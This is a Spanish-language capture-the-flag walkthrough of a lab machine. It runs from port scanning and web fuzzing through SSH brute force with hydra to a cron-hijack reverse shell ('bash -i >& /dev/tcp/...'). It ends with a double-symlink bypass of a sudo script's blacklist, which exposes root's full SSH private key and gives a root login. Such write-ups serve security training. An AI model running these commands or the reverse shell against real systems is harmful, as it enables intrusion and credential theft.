## FASE DE ENUMERACIÓN
sabiendo que la IP de la máquina victima es : 172.17.0.2
```bash
sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 -oN PuertosYservicios 172.17.0.2
```
me reporta este resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)
|_  256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: CyberGuard - Seguridad Digital
```
puerto 22 y puerto 80 abiertos.

El puerto 22 es ssh version no vulnerable, sin credenciales ni users no podemos hacer gran cosa, asi pues nos centramos 
en el puerto 80

Hacemos fuzzing:
```bash
feroxbuster -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,js,old,bak -o fuzzFero
```
decubriendo algunas rutas:
```
1543822/1543822 6486647/s http://172.17.0.2/images/ => Directory listing
[####################] - 0s   1543822/1543822 385955500/s http://172.17.0.2/archiv/ => Directory listing
```
en esta ruta encontramos algo interesante:
```bash
http://172.17.0.2/archiv/script.js
```
```
const usuariosPermitidos = {
    'admin': 'CyberSecure123',
    'cliente': 'Password123',
    'chloe' : 'chloe123'
```
credenciales en texto plano.

## FASE INTRUSIÓN

Utilizamos las credenciales proporconadas en un ataque de fuerza bruta, hice un diccionario con los 3 user y otro con los 3 password,
hago fuerzabruta con hydra:
```bash
hydra -L users.txt  -P password.txt -t 16 -V -f -I ssh://172.17.0.2
```
```
[22][ssh] host: 172.17.0.2   login: chloe   password: chloe123
```
me conecto por ssh como chloe y uso la contraseña para loguearme:
```bash
ssh chloe@172.17.0.2
```

## FASE ESCALADA DE PRIVILEGIOS
miramos los usuarios que hay:
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
veronica:x:1001:1001:,,,:/home/veronica:/bin/bash
pablo:x:1002:1002:,,,:/home/pablo:/bin/bash
chloe:x:1003:1003:,,,:/home/chloe:/bin/bash
````
Investigo si tengo algún privilegio y no encuentro nada, lo que si veo es que tengo acceso al home de veronica:
```bash
cd /home
````
miramos los propietarios y permisos de las carpetas:
```bash
ls -la
```
```
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 .
drwxr-xr-x 1 root     root     4096 May 11 07:13 ..
drwxr-x--- 1 chloe    chloe    4096 Apr 18 22:14 chloe
drwxr-x--- 1 pablo    pablo    4096 May  2 18:11 pablo
drwxr-x--- 2 ubuntu   ubuntu   4096 Jan 26 22:09 ubuntu
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 veronica
```
entramos en el home de veronica:
```bash
cd veronica/
```
miramos permisos:
```bash
ls -la
```
```
total 48
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 ..
-rw-r--r-- 1 veronica veronica   17 Apr 18 22:18 .bash_history
-rw-r--r-- 1 veronica veronica  220 Apr 16 23:00 .bash_logout
-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc
drwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local
-rw-r--r-- 1 veronica veronica  807 Apr 16 23:00 .profile
-rw------- 1 veronica veronica    7 Apr 18 16:35 .python_history
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
```
investigando encontramos esto:
```bash
cat .bash_history
```
```
dmVyb25pY2ExMjMK
```
parece un base64, lo decodeamos:
```bash
echo "dmVyb25pY2ExMjMK" | base64 -d
```
```
veronica123
```
provamos a cambiar al usuario veronica:
```bash
su veronica
```
pero al introducir el pass no nos deja
```
su: Authentication failure
```
provamos por SSH desde una terminal:
```bash
veronica@172.17.0.2
````
y ahora introduciendo el pass si nos deja.
 miramos los grupos a los que pertenece veronica:
 ```bash
id
```
```
uid=1001(veronica) gid=1001(veronica) groups=1001(veronica),100(users),1004(taller)
```
grupo "taller" lo tendremos en cuenta

miramos que tenemos por el home:
```bash
ls -la
```
```
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 ..
-rw-r--r-- 1 veronica veronica   17 Apr 18 22:18 .bash_history
-rw-r--r-- 1 veronica veronica  220 Apr 16 23:00 .bash_logout
-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc
drwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local
-rw-r--r-- 1 veronica veronica  807 Apr 16 23:00 .profile
-rw------- 1 veronica veronica    7 Apr 18 16:35 .python_history
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
```
y después de mirar un poco vemos esto:
```bash
cd .local/
ls -la
```
```
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11ués .
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 ..
-rwxrwx--x 1 pablo    taller    121 Apr 17 17:23 script-h.sh
drwx------ 3 veronica veronica 4096 Apr 18 10:47 share
```

grupo taller, nos vamos a /tmp
```bash
cd /tmp
```

y pudiendo usar nc nos pasamos pspy64 para poder mirar procesos:

en la máquina victima:
```bash
nc -lvp 4444 > pspy64
```
en la máquina atacante donde tenemos el binario pspy64:
```bash
nc 172.17.0.2 4444 -w 3 < pspy64
```
una vez que lo tenemos damos permisos de ejecucion:
```bash
chmod +x pspy64
```
y lo ejecutamos:
```bash
./pspy64
```
vemos este proceso:
```
2025/05/11 07:33:01 CMD: UID=1002  PID=336    | /bin/sh -c /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1
```
el UID de usuario es 1002, que acordandonos del passwd "pablo:x:1002:1002:,,,:/home/pablo:/bin/bash" pertenece a pablo
miramos el script  /home/veronica/.local/script-h.sh que podemos modificar, así pues hacemos nano al script e introducimos unos comandos:
```bash
nano  /home/veronica/.local/script-h.sh
```
introducimos esta linea "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" quedando el script así:
```
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
hora_actual=$(date +"%H:%M:%S")


echo "La hora actual del sistema es: $hora_actual" >> /tmp/hora/hora.log
```
me pongo en escucha por el puerto 4444
```bash
sudo nc -lvnp 4444
```
y ya soy el usuario pablo.

compruebo que puedo ejecutar con privilegios sudo:
```bash
sudo -l
```
```
(ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
```
compruebo si tengo acceso al script /opt/nllns/clean_symlink.py
```bash
ls -la /opt/nllns/clean_symlink.py
```
```
-rwxr-xr-x 1 root root 1007 Apr 26 14:13 /opt/nllns/clean_symlink.py
```
puedo leerlo, vamos a ver que puede hacer:
```bash
cat /opt/nllns/clean_symlink.py
```
```
#!/usr/bin/env python3

import os
import sys
import shutil

QUAR_DIR = "/var/quarantined"

if len(sys.argv) != 2:
    print("¡Se requiere un argumento: el enlace simbólico a un archivo .jpg!")
    sys.exit(1)

LINK = sys.argv[1]

if not LINK.endswith('.jpg'):
    print("¡El primer argumento debe ser un archivo .jpg!")
    sys.exit(2)

if os.path.islink(LINK):
    LINK_NAME = os.path.basename(LINK)
    LINK_TARGET = os.readlink(LINK)

    if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
        print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
        os.unlink(LINK)
    else:
        print(f"Enlace encontrado [{LINK}], moviéndolo a cuarentena.")
        shutil.move(LINK, os.path.join(QUAR_DIR, LINK_NAME))
        if os.path.exists(os.path.join(QUAR_DIR, LINK_NAME)):
            print("Contenido:")
            with open(os.path.join(QUAR_DIR, LINK_NAME), 'r') as f:
                print(f.read())
else:
    print(f"El enlace [{LINK}] no es un enlace simbólico.")
```
básicamente se le pasa un archivo, verifica que termine en .jpg y sino sale, comprueba que sea un enlace simbólico, extrae el nombre, mira donde apunta, y esta parte nos va a dar problemas:
```
  if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
        print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
        os.unlink(LINK)
```
porque si contiene "etc" o "root" nos lo va a eliminar, de pasar el filtro lo pasa a la carpeta cuarentena y luego intenta abrir el archivo.
Si investigamos un poco la carpeta del home de pablo vamos a ver una cosa interesante:
```bash
cd Documents/
ls -la
```
```
drwxrwxr-x 1 pablo pablo 4096 May  2 18:11 .
drwxr-x--- 1 pablo pablo 4096 May  2 18:11 ..
-rw-r--r-- 1 root  root    25 Apr 26 13:32 importante.txt
```
```bash
cat importante.txt
```
```
revisa el /root/root.txt
```

con todo lo que tenemos solo se me ocurre hacer un enlace simbolico de /root/root.txt y hacer un enlace a ese enlace para ver si me puedo saltar
la restricción de que contenga "root"
me voy a tmp;
```bash
cd /tmp
```
creo una carpeta:
```bash
mkdir /tmp/fake
```
hago un enlace simbolico
```bash
ln -s /root/root.txt /tmp/fake/file.jpg
```
hago un enlace del enlace xD
```bash
ln -s /tmp/fake/file.jpg indirecto.jpg
```
/tmp/fake/file.jpg sí contiene la palabra "root", pero indirecto.jpg apunta a una ruta que no la contiene directamente.
ejecuto el script:
```bash
sudo /usr/bin/python3 /opt/nllns/clean_symlink.py indirecto.jpg
```
```
Enlace encontrado [indirecto.jpg], moviéndolo a cuarentena.
Contenido:
prueba esta password, si no es esta entonces estamos jodidos: yhgjhbjxhdbkadkcnkhalkmlk===kjjh
```
ahora tenemos un hash....y es un rabbit hole (o al menos después de varios intentos yo desistí) viendo que puedo ver cosas 
haciendo doble enlace simbolico para saltarme la black list del script pruebo con el id_rsa de root:
```bash
mkdir /tmp/fake3
ln -s /root/.ssh/id_rsa /tmp/fake3/file.jpg
ln -s /tmp/fake3/file.jpg indirecto3.jpg
sudo /usr/bin/python3 /opt/nllns/clean_symlink.py indirecto3.jpg
```
¡¡¡BINGO!!! TENEMOS ID_RSA:
```
Enlace encontrado [indirecto3.jpg], moviéndolo a cuarentena.
Contenido:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
vale, nos copiamos la key ( en mi caso lo nombré cmo rsa_root) y le damos permisos:
```bash
chmod 600 rsa_root 
```
```bash
 ssh -i rsa_root root@172.17.0.2
```
```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri May  2 17:00:02 2025 from ::1
root@35deb482f351:~# id
uid=0(root) gid=0(root) groups=0(root)
root@35deb482f351:~# 
```
logré descargarme antes el shadow e intenté crackearlo, pero como soy un caga prisas y john estaba tardando probé si sonaba la flauta y sonó.
Espero que quede clara la guía.
